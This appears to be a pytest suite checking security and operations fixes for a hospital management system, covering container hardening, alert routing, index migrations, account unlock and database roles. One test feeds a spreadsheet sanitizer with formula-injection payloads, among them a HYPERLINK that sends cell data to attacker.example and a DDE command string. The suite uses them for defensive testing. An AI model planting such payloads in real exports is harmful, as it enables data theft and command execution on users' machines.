"""
Test suite verifying remediation of findings from Sections 26 & 27:
- N-91: Redis service container user configuration under dropped capabilities
- N-90: Real email alerting receivers and refusal of dummy webhook in production
- N-93: World-readable permissions (chmod 644) on Prometheus textfile metrics
- N-94: Idempotent foreign key index migrations (if_not_exists) and invalid index repair
- N-95: Textfile collector directory environment variable consistency
"""

import os
from pathlib import Path
import pytest
import yaml

from backend.scripts.render_alertmanager_config import render_alertmanager_config


def test_n91_redis_container_user_and_service_capabilities():
    """
    N-91: Redis must run with user: '999:1000' so that it does not attempt root writes
    to /data under cap_drop: [ALL]. docker-proxy has tmpfs /run, and clamav retains SETUID/SETGID.
    """
    compose_path = Path("docker-compose.prod.yml")
    assert compose_path.is_file()
    compose = yaml.safe_load(compose_path.read_text(encoding="utf-8"))

    redis_svc = compose["services"]["redis"]
    assert redis_svc.get("user") == "999:1000", "Redis service must specify user: '999:1000'"
    assert redis_svc.get("cap_drop") == ["ALL"], "Redis must drop all capabilities"

    # docker-proxy tmpfs for read_only container filesystem
    proxy_svc = compose["services"]["docker-proxy"]
    assert "/run" in proxy_svc.get("tmpfs", []), "docker-proxy must have /run tmpfs mount"

    # clamav SETUID/SETGID/CHOWN/DAC_OVERRIDE capability preservation
    clamav_svc = compose["services"]["clamav"]
    assert "SETUID" in clamav_svc.get("cap_add", [])
    assert "SETGID" in clamav_svc.get("cap_add", [])
    assert "CHOWN" in clamav_svc.get("cap_add", [])
    assert "DAC_OVERRIDE" in clamav_svc.get("cap_add", [])


def test_n90_alertmanager_email_delivery_and_production_guard(tmp_path):
    """
    N-90: Alertmanager must configure email_configs across all receivers so SMTP settings
    actually deliver alerts, and render_alertmanager_config must reject dummy webhook in production.
    """
    am_path = Path("deployments/alertmanager.yml")
    assert am_path.is_file()
    am_data = yaml.safe_load(am_path.read_text(encoding="utf-8"))

    # Receivers must have valid email_configs
    receivers = am_data.get("receivers", [])
    assert len(receivers) >= 3
    for recv in receivers:
        assert "email_configs" in recv, f"Receiver {recv.get('name')} must have email_configs"
        assert len(recv["email_configs"]) > 0
        to_addr = recv["email_configs"][0].get("to")
        assert to_addr and "@" in to_addr

    # Production guard: when ENVIRONMENT=production, dummy ingress webhook must raise ValueError
    prod_env = tmp_path / "prod.env"
    prod_env.write_text("ENVIRONMENT=production\n", encoding="utf-8")
    out_file = tmp_path / "am.out.yml"
    with pytest.raises(ValueError, match="Production Alertmanager cannot use circular dummy webhook"):
        render_alertmanager_config(env_file=prod_env, output_file=out_file)

    # Valid external webhook in production succeeds
    valid_prod_env = tmp_path / "valid_prod.env"
    valid_prod_env.write_text(
        "ENVIRONMENT=production\n"
        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n"
        "ALERT_EMAIL_TO=emergency-oncall@hospital.org\n",
        encoding="utf-8",
    )
    render_alertmanager_config(env_file=valid_prod_env, output_file=out_file)
    valid_data = yaml.safe_load(out_file.read_text(encoding="utf-8"))
    assert valid_data["receivers"][0]["email_configs"][0]["to"] == "emergency-oncall@hospital.org"
    assert valid_data["receivers"][0]["webhook_configs"][0]["url"] == "https://alerts.hospital.org/webhook"


def test_n93_n95_backup_metrics_chmod_and_variable_consistency():
    """
    N-93 & N-95:
    - backup-postgres.sh must apply chmod 644 to metric files so user 65534 (node-exporter) can read them.
    - Script and compose must support both NODE_EXPORTER_TEXTFILE_DIR and NODE_EXPORTER_TEXTFILE_HOST_PATH.
    """
    backup_sh = Path("deployments/backup-postgres.sh").read_text(encoding="utf-8")

    # chmod 644 must be present for both status and success files
    assert 'chmod 644 "$textfile_dir/backup_postgres_status.prom"' in backup_sh
    assert 'chmod 644 "$textfile_dir/backup_postgres_last_success.prom"' in backup_sh

    # Both variable names must be handled
    assert "NODE_EXPORTER_TEXTFILE_DIR" in backup_sh
    assert "NODE_EXPORTER_TEXTFILE_HOST_PATH" in backup_sh

    # Check .env.example
    env_example = Path(".env.example").read_text(encoding="utf-8")
    assert "NODE_EXPORTER_TEXTFILE_HOST_PATH=" in env_example
    assert "NODE_EXPORTER_TEXTFILE_DIR=" in env_example


def test_n94_index_builder_handles_invalid_indexes_and_idempotent_migration():
    """
    N-94:
    - Alembic migration e1a3c7b5d902 must specify if_not_exists=True on all create_index calls.
    - build_indexes_concurrently.py must query indisvalid to detect broken indexes.
    """
    migration_path = Path("backend/alembic/versions/e1a3c7b5d902_complete_foreign_key_indexes.py")
    assert migration_path.is_file()
    migration_text = migration_path.read_text(encoding="utf-8")

    # All 134 create_index calls must have if_not_exists=True
    create_calls = [l for l in migration_text.splitlines() if "op.create_index(" in l]
    assert len(create_calls) == 134
    for call in create_calls:
        assert "if_not_exists=True" in call

    # build_indexes_concurrently.py must query indisvalid
    builder_text = Path("backend/scripts/build_indexes_concurrently.py").read_text(encoding="utf-8")
    assert "indisvalid" in builder_text
    assert "DROP INDEX CONCURRENTLY IF EXISTS" in builder_text
    assert "get_invalid_postgres_indexes" in builder_text


def test_n96_spreadsheet_formula_injection_sanitization():
    """
    N-96: Formulas starting with =, +, -, @, \\t, or \\r must be prefixed with a single quote (')
    to prevent spreadsheet injection (CSV/Excel DDE), while preserving valid numbers.
    """
    from backend.core.export import sanitize_spreadsheet_cell, format_export_cell

    assert sanitize_spreadsheet_cell('=HYPERLINK("http://attacker.example/c?d="&B2,"Click")').startswith("'=")
    assert sanitize_spreadsheet_cell('@SUM(1+1)*cmd').startswith("'@")
    assert sanitize_spreadsheet_cell('\tcmd /C calc').startswith("'\t")
    assert sanitize_spreadsheet_cell('+calc').startswith("'+")

    # Valid numbers with signs must remain unchanged
    assert sanitize_spreadsheet_cell("-42") == "-42"
    assert sanitize_spreadsheet_cell("+3.14") == "+3.14"
    assert sanitize_spreadsheet_cell("-0.05") == "-0.05"
    assert sanitize_spreadsheet_cell("Plain Text") == "Plain Text"

    # Formatted cell export
    assert format_export_cell("=cmd|' /C calc'!A0").startswith("'=")


def test_n99_production_alertmanager_recipient_enforcement(tmp_path):
    """
    N-99: Production Alertmanager configuration must reject missing, invalid,
    or placeholder recipient emails (oncall@avinya-hms.local) instead of silently substituting them.
    """
    out_file = tmp_path / "am_test.yml"

    # 1. Missing recipient in production
    missing_env = tmp_path / "missing_recipient.env"
    missing_env.write_text(
        "ENVIRONMENT=production\n"
        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="Production Alertmanager requires a valid on-call recipient email"):
        render_alertmanager_config(env_file=missing_env, output_file=out_file)

    # 2. Placeholder recipient in production
    placeholder_env = tmp_path / "placeholder_recipient.env"
    placeholder_env.write_text(
        "ENVIRONMENT=production\n"
        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n"
        "ALERT_EMAIL_TO=oncall@avinya-hms.local\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="Production Alertmanager requires a valid on-call recipient email"):
        render_alertmanager_config(env_file=placeholder_env, output_file=out_file)

    # 3. Invalid email without '@'
    bad_email_env = tmp_path / "bad_email.env"
    bad_email_env.write_text(
        "ENVIRONMENT=production\n"
        "ALERT_DEFAULT_WEBHOOK_URL=https://alerts.hospital.org/webhook\n"
        "ALERT_EMAIL_TO=invalid-oncall-address\n",
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="Production Alertmanager requires a valid on-call recipient email"):
        render_alertmanager_config(env_file=bad_email_env, output_file=out_file)


def test_n100_procurement_purchase_order_html_print(client, superuser_headers):
    """
    N-100: GET /api/procurement/purchase-orders/{id}/print?format=html must render HTML
    without crashing due to missing HTMLResponse import.
    """
    from datetime import datetime, timedelta, timezone

    # 1. Create vendor
    v_res = client.post(
        "/v1/api/procurement/vendors",
        headers=superuser_headers,
        json={
            "code": f"VND-{os.urandom(3).hex().upper()}",
            "name": "PharmaCorp Supplies",
            "category": "PHARMACEUTICALS",
            "contact_person": "Jane Doe",
            "phone": "9876543210",
            "email": "orders@pharmacorp.internal",
            "address": "123 Logistics Park",
            "credit_period_days": 30,
        },
    )
    assert v_res.status_code == 201, f"Vendor creation failed: {v_res.text}"
    vendor_id = v_res.json()["id"]

    # 2. Create purchase order
    po_res = client.post(
        "/v1/api/procurement/purchase-orders",
        headers=superuser_headers,
        json={
            "vendor_id": vendor_id,
            "delivery_due_date": (datetime.now(timezone.utc) + timedelta(days=10)).isoformat(),
            "payment_terms": "Net 30 Days",
            "items": [
                {
                    "item_description": "Paracetamol 500mg Bulk",
                    "quantity_ordered": 100,
                    "unit_price_paise": 250,
                }
            ],
        },
    )
    assert po_res.status_code == 201, f"PO drafting failed: {po_res.text}"
    po_id = po_res.json()["id"]

    # 2b. Approve PO (only approved POs can be printed)
    app_res = client.patch(
        f"/v1/api/procurement/purchase-orders/{po_id}/approve",
        headers=superuser_headers,
    )
    assert app_res.status_code == 200, f"PO approval failed: {app_res.text}"

    # 3. Print HTML
    html_res = client.get(
        f"/v1/api/procurement/purchase-orders/{po_id}/print?format=html",
        headers=superuser_headers,
    )
    assert html_res.status_code == 200
    assert "text/html" in html_res.headers.get("content-type", "")
    assert "Paracetamol 500mg Bulk" in html_res.text


def test_n98_dpdp_dossier_populated_and_integrity(client, superuser_headers, multi_tenant_env):
    """
    N-98: The DPDP Section 11 data portability dossier must export authentic master fields:
    allergen names and reactions, ICD-10 diagnosis codes and remarks, medicine brand/strength/dosage,
    and diagnostic order investigations with result values, without crashing on invented attributes.
    """
    from datetime import datetime, timezone
    from sqlalchemy.orm import sessionmaker
    from backend.domains.patients.models import Patient, AllergyMaster, PatientAllergy, AllergySeverityEnum, GenderEnum, AllergyCategoryEnum
    from backend.domains.clinical.models import EncounterDiagnosis, DiagnosisMaster, DiagnosisTypeEnum
    from backend.domains.encounters.models import PatientEncounter, EncounterTypeEnum, EncounterStatusEnum
    from backend.domains.pharmacy.models import Prescription, PrescriptionItem, PrescriptionStatusEnum, MedicationMaster, MedicationFormEnum
    from backend.domains.diagnostics.models import DiagnosticOrder, DiagnosticTask, OrderStatusEnum, TaskStatusEnum, ServiceCatalog, ServiceCategory, ServiceTypeEnum
    from backend.domains.facility.models import Department
    from backend.domains.identity.models import User
    from backend.domains.privacy.models import PatientDataRightsRequest, PrivacyDecisionAudit

    SessionLocal = sessionmaker(bind=multi_tenant_env["tenant_engines"]["hms_default"])
    with SessionLocal() as db:
        # 1. Create doctor/user
        user = db.query(User).first()

        # 2. Seed department & services
        dept = db.query(Department).first()
        if not dept:
            dept = Department(name="Diagnostics", code="DIAG-01", is_active=True)
            db.add(dept)
            db.commit()

        cat = db.query(ServiceCategory).first()
        if not cat:
            cat = ServiceCategory(name="Laboratory", code="LAB-CAT", department_id=dept.id, is_active=True)
            db.add(cat)
            db.commit()

        service = db.query(ServiceCatalog).filter_by(code="LAB-FBS-01").first()
        if not service:
            service = ServiceCatalog(
                category_id=cat.id,
                code="LAB-FBS-01",
                name="Fasting Blood Sugar",
                service_type=ServiceTypeEnum.LAB,
                base_price_paise=25000,
                loinc_code="1558-6",
                is_active=True,
            )
            db.add(service)
            db.commit()

        # 3. Seed medication master
        med = db.query(MedicationMaster).filter_by(code="MED-MET-500").first()
        if not med:
            med = MedicationMaster(
                code="MED-MET-500",
                brand_name="Metformin-500",
                generic_name="Metformin Hydrochloride",
                form=MedicationFormEnum.TABLET,
                strength="500 mg",
                is_active=True,
            )
            db.add(med)
            db.commit()

        # 4. Seed diagnosis master
        diag = db.query(DiagnosisMaster).filter_by(icd10_code="E11.9").first()
        if not diag:
            diag = DiagnosisMaster(
                department_id=dept.id,
                icd10_code="E11.9",
                short_description="Type 2 diabetes mellitus without complications",
                full_description="Type 2 diabetes mellitus without complications (diet-controlled)",
                is_billable=True,
                is_active=True,
            )
            db.add(diag)
            db.commit()

        # 5. Seed allergy master
        allergy_m = db.query(AllergyMaster).filter_by(code="ALL-PEN-01").first()
        if not allergy_m:
            allergy_m = AllergyMaster(
                department_id=dept.id,
                code="ALL-PEN-01",
                name="Penicillin",
                category=AllergyCategoryEnum.DRUG,
                is_active=True,
            )
            db.add(allergy_m)
            db.commit()

        # 6. Create patient
        mrn_rand = f"MRN-{os.urandom(3).hex().upper()}"
        p = Patient(
            mrn=mrn_rand,
            full_name="Lakshmi Narayanan",
            date_of_birth=datetime(1985, 4, 12, tzinfo=timezone.utc),
            gender=GenderEnum.FEMALE,
            phone_number="9876543210",
            is_active=True,
        )
        db.add(p)
        db.commit()
        db.refresh(p)

        # 7. Add patient allergy with reaction
        p_allergy = PatientAllergy(
            patient_id=p.id,
            allergy_id=allergy_m.id,
            severity=AllergySeverityEnum.SEVERE,
            reaction_description="Anaphylaxis and generalized urticaria",
            recorded_by_user_id=user.id,
            is_active=True,
        )
        db.add(p_allergy)

        # 8. Add encounter, diagnosis, prescription, and diagnostic order
        enc = PatientEncounter(
            patient_id=p.id,
            encounter_type=EncounterTypeEnum.OPD,
            status=EncounterStatusEnum.ACTIVE,
            primary_doctor_id=user.id,
            department_id=dept.id,
            created_at=datetime.now(timezone.utc),
        )
        db.add(enc)
        db.commit()
        db.refresh(enc)

        enc_diag = EncounterDiagnosis(
            encounter_id=enc.id,
            diagnosis_id=diag.id,
            diagnosis_type=DiagnosisTypeEnum.PRIMARY,
            clinical_remarks="Diet and lifestyle controlled, baseline screening",
        )
        db.add(enc_diag)

        rx = Prescription(
            encounter_id=enc.id,
            prescribing_doctor_id=user.id,
            status=PrescriptionStatusEnum.ACTIVE,
            clinical_notes="Take with meals",
        )
        db.add(rx)
        db.commit()
        db.refresh(rx)

        rx_item = PrescriptionItem(
            prescription_id=rx.id,
            medication_id=med.id,
            dosage_instruction="500 mg twice daily with meals",
            requested_quantity=60,
            dispensed_quantity=60,
        )
        db.add(rx_item)

        # Diagnostic order with task and result
        diag_order = DiagnosticOrder(
            patient_id=p.id,
            ordering_doctor_id=user.id,
            clinical_notes="Routine diabetes monitoring",
            status=OrderStatusEnum.COMPLETED,
        )
        db.add(diag_order)
        db.commit()
        db.refresh(diag_order)

        task = DiagnosticTask(
            order_id=diag_order.id,
            service_id=service.id,
            status=TaskStatusEnum.VERIFIED,
            result_value="110 mg/dL",
            result_notes="Fasting blood glucose within target range",
            is_critical_panic=False,
        )
        db.add(task)

        # Submit data-rights request
        dr_req = PatientDataRightsRequest(
            patient_id=p.id,
            request_type="PORTABILITY",
            status="SUBMITTED",
            details={"reason": "Patient Section 11 request"},
            sla_deadline=datetime.now(timezone.utc),
        )
        db.add(dr_req)
        db.commit()
        db.refresh(dr_req)

        # 9. Call dossier export endpoint
        res = client.get(
            f"/v1/api/privacy/data-rights/patients/{p.id}/export-dossier?request_id={dr_req.id}",
            headers=superuser_headers,
        )
        assert res.status_code == 200, f"Expected 200 OK, got {res.status_code}: {res.text}"
        dossier = res.json()

        # Verify bundle integrity hash
        assert "bundle_integrity_sha256" in dossier["export_metadata"]
        assert len(dossier["export_metadata"]["bundle_integrity_sha256"]) == 64

        # Verify allergies
        assert len(dossier["allergies"]) == 1
        assert dossier["allergies"][0]["allergen"] == "Penicillin"
        assert dossier["allergies"][0]["reaction"] == "Anaphylaxis and generalized urticaria"
        assert dossier["allergies"][0]["severity"] == "SEVERE"

        # Verify diagnoses
        assert len(dossier["diagnoses"]) == 1
        assert dossier["diagnoses"][0]["icd10_code"] == "E11.9"
        assert dossier["diagnoses"][0]["condition_name"] == "Type 2 diabetes mellitus without complications"
        assert dossier["diagnoses"][0]["clinical_remarks"] == "Diet and lifestyle controlled, baseline screening"

        # Verify prescriptions
        assert len(dossier["prescriptions"]) == 1
        rx_items = dossier["prescriptions"][0]["items"]
        assert len(rx_items) == 1
        assert rx_items[0]["brand_name"] == "Metformin-500"
        assert rx_items[0]["strength"] == "500 mg"
        assert rx_items[0]["dosage_instruction"] == "500 mg twice daily with meals"

        # Verify diagnostics & results
        assert len(dossier["diagnostics"]) == 1
        invs = dossier["diagnostics"][0]["investigations"]
        assert len(invs) == 1
        assert invs[0]["service_name"] == "Fasting Blood Sugar"
        assert invs[0]["loinc_code"] == "1558-6"
        assert invs[0]["result_value"] == "110 mg/dL"
        assert invs[0]["is_critical_panic"] is False

        # Verify tamper-evident PrivacyDecisionAudit entry
        audit = db.query(PrivacyDecisionAudit).filter_by(
            data_use_point="privacy.data_rights.export_dossier",
            purpose_code="DPDP_SECTION_11_PORTABILITY",
        ).first()
        assert audit is not None
        assert f"patient_id={p.id}" in audit.reason_code


def test_third_party_image_digests_pinned_in_docker_compose():
    """
    Section 28.4: Verify that all third-party service images in docker-compose.prod.yml
    are pinned by immutable sha256 digests.
    """
    compose_path = Path("docker-compose.prod.yml")
    assert compose_path.is_file()
    compose = yaml.safe_load(compose_path.read_text(encoding="utf-8"))

    third_party_services = [
        "docker-proxy",
        "reverse-proxy",
        "db",
        "redis",
        "clamav",
        "prometheus",
        "alertmanager",
        "postgres-exporter",
        "redis-exporter",
        "node-exporter",
    ]

    for svc_name in third_party_services:
        svc = compose["services"][svc_name]
        image = svc.get("image", "")
        assert "@sha256:" in image, f"Service '{svc_name}' image '{image}' must be pinned with @sha256 digest"


def test_f05_account_lockout_self_service_unlock_flow(client, multi_tenant_env):
    """
    F-05 / Section 28.4: Verify self-service account unlock via cryptographically signed token.
    An account locked out following repeated failures can be restored via /unlock/verify.
    """
    from sqlalchemy.orm import Session
    from backend.domains.identity.models import User, UserStatusEnum
    from backend.domains.privacy.models import PrivacyDecisionAudit
    from backend.domains.identity.auth_router import _issue_unlock_token
    from backend.core.database import resolve_tenant_context

    engine = multi_tenant_env["tenant_engines"]["hms_default"]
    with Session(engine) as db:
        user = db.query(User).filter_by(email="doctor@default.com").one()
        user.status = UserStatusEnum.LOCKED
        user.failed_login_attempts = 5
        db.commit()

    # 1. Verify locked account cannot log in
    res = client.post(
        "/v1/api/auth/login",
        headers={"X-Hospital-Subdomain": "default"},
        json={"email": "doctor@default.com", "password": "StaffPass123!"},
    )
    assert res.status_code == 401

    # 2. Request self-service unlock instructions
    req_res = client.post(
        "/v1/api/auth/unlock/request",
        headers={"X-Hospital-Subdomain": "default"},
        json={"email": "doctor@default.com"},
    )
    assert req_res.status_code == 202
    assert "unlock instructions" in req_res.json()["message"]

    # 3. Simulate issued unlock token for the user
    with Session(engine) as db:
        user = db.query(User).filter_by(email="doctor@default.com").one()
        from backend.control_plane.models import TenantRegistry
        with multi_tenant_env["control_session_factory"]() as cp_db:
            reg = cp_db.query(TenantRegistry).filter_by(subdomain_slug="default").one()
            from backend.core.database import TenantContext
            from backend.security.envelope import decrypt_tenant_secret
            tenant = TenantContext(
                subdomain_slug=reg.subdomain_slug,
                branch_code=reg.branch_code,
                hospital_name=reg.hospital_name,
                db_name=reg.db_name,
                jwt_secret_key=decrypt_tenant_secret(reg.jwt_secret_key),
            )
            unlock_token = _issue_unlock_token(user, tenant)

    # 4. Verify unlock with token
    verify_res = client.post(
        "/v1/api/auth/unlock/verify",
        headers={"X-Hospital-Subdomain": "default"},
        json={"token": unlock_token},
    )
    assert verify_res.status_code == 200
    assert "successfully unlocked" in verify_res.json()["message"]

    # 5. User can now successfully log in
    login_res = client.post(
        "/v1/api/auth/login",
        headers={"X-Hospital-Subdomain": "default"},
        json={"email": "doctor@default.com", "password": "StaffPass123!"},
    )
    assert login_res.status_code == 200
    assert "access_token" in login_res.json()

    # 6. Verify audit record was created
    with Session(engine) as db:
        user = db.query(User).filter_by(email="doctor@default.com").one()
        assert user.status == UserStatusEnum.ACTIVE
        assert user.failed_login_attempts == 0
        audit = db.query(PrivacyDecisionAudit).filter_by(
            data_use_point="identity.user.self_unlock"
        ).first()
        assert audit is not None
        assert f"user_id={user.id}" in audit.reason_code


def test_bootstrap_apply_roles_cli_and_sql_script(monkeypatch):
    """
    Section 28.4 / 28.5: Verify postgres-roles.sql defines all 4 least-privilege roles
    and bootstrap.py supports --apply-roles argument.
    """
    roles_sql_path = Path("deployments/postgres-roles.sql")
    assert roles_sql_path.is_file()
    sql_text = roles_sql_path.read_text(encoding="utf-8")

    # Verify all least-privilege roles are declared
    for role in ["hms_app", "hms_migrator", "hms_backup", "hms_exporter"]:
        assert f"rolname = '{role}'" in sql_text
        assert f"CREATE ROLE {role}" in sql_text

    # Verify standard predefined role assignments
    assert "GRANT pg_read_all_data TO hms_backup;" in sql_text
    assert "GRANT pg_monitor TO hms_exporter;" in sql_text

    # Test bootstrap CLI parser handles --apply-roles
    from backend.scripts.bootstrap import main
    calls = []
    monkeypatch.setattr("backend.scripts.bootstrap.bootstrap_system", lambda apply_roles=False: calls.append(apply_roles))
    
    assert main(["--apply-roles"]) == 0
    assert calls == [True]


